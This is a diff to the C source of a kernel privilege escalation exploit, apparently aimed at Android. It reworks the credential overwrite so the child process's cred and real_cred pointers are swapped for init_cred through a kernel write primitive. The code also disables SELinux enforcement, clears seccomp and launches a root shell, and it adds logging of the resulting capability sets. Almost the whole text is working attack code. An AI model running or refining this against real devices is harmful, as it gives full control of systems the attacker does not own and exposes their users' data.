@@ -699,7 +699,22 @@ int main(int argc, char **argv) {
       __asm__ volatile("yield" ::: "memory");
     }
     
-    pr_success("[CHILD] uid=%d euid=%d\n", getuid(), geteuid());
+    pr_success("[CHILD] uid=%d gid=%d euid=%d egid=%d\n",
+               getuid(), getgid(), geteuid(), getegid());
+    {
+      FILE *cf = fopen("/proc/self/status", "r");
+      char lb[256];
+      if (cf) {
+        while (fgets(lb, sizeof(lb), cf)) {
+          if (!strncmp(lb, "CapPrm:", 7) ||
+              !strncmp(lb, "CapEff:", 7) ||
+              !strncmp(lb, "CapBnd:", 7)) {
+            pr_success("[CHILD] %s", lb);
+          }
+        }
+        fclose(cf);
+      }
+    }
     pr_success("[CHILD] Running root action. Launching shell...\n");
     
     dup2(__orig_stdout, STDOUT_FILENO);
@@ -729,40 +744,17 @@ int main(int argc, char **argv) {
   pr_success("SELinux write_trigger=%d enforce=%d->%d\n", wr, before, after);
   record_stage('6');
 
-  if (!write_value(child_cred + 0x04, 0)) { pr_error("child uid/gid write failed\n"); }
+  if (!write_value(child_task + 0x808, k_init_cred)) { pr_error("child cred -> init_cred failed\n"); }
   record_stage('8');
-  pr_success("Child uid=gid=0\n");
+  pr_success("Child task->cred -> init_cred\n");
 
-  if (!write_value(child_cred + 0x14, 0)) { pr_error("child euid/egid write failed\n"); }
+  if (!write_value(child_task + 0x800, k_init_cred)) { pr_error("child real_cred -> init_cred failed\n"); }
   record_stage('9');
-  pr_success("Child euid=egid=0\n");
+  pr_success("Child task->real_cred -> init_cred\n");
 
-  if (!write_value(child_cred + 0x24, 0)) { pr_error("child securebits write failed\n"); }
+  if (!write_value(k_init_cred + 0x04, 0)) { pr_error("init_cred uid/gid repair failed\n"); }
   record_stage('s');
-  pr_success("Child securebits=0\n");
-
-  const uint64_t capval = (k_write_value & ~UINT64_C(0xffff)) | UINT64_C(0xffff);
-  pr_info("Payload capval=0x%016llx\n", (unsigned long long)capval);
-
-  if (!write_value(child_cred + 0x38, capval)) { pr_error("child cap_effective write failed\n"); }
-  record_stage('b');
-  pr_success("Child cap_effective=0x%016llx\n", (unsigned long long)capval);
-
-  if (!write_value(child_cred + 0x30, capval)) { pr_error("child cap_permitted write failed\n"); }
-  record_stage('a');
-  pr_success("Child cap_permitted=0x%016llx\n", (unsigned long long)capval);
-
-  if (!write_value(child_cred + 0x40, capval)) { pr_error("child cap_bset write failed\n"); }
-  record_stage('c');
-  pr_success("Child cap_bset=0x%016llx\n", (unsigned long long)capval);
-
-  if (!write_value(child_cred + 0x28, capval)) { pr_error("child cap_inheritable write failed\n"); }
-  record_stage('d');
-  pr_success("Child cap_inheritable=0x%016llx\n", (unsigned long long)capval);
-
-  if (!write_value(child_cred + 0x48, capval)) { pr_error("child cap_ambient write failed\n"); }
-  record_stage('e');
-  pr_success("Child cap_ambient=0x%016llx\n", (unsigned long long)capval);
+  pr_success("init_cred uid/gid repaired to 0\n");
 
   if (!write_value(child_task + OFF_TASK_SECCOMP, 0)) {
     pr_error("child seccomp clear failed\n");
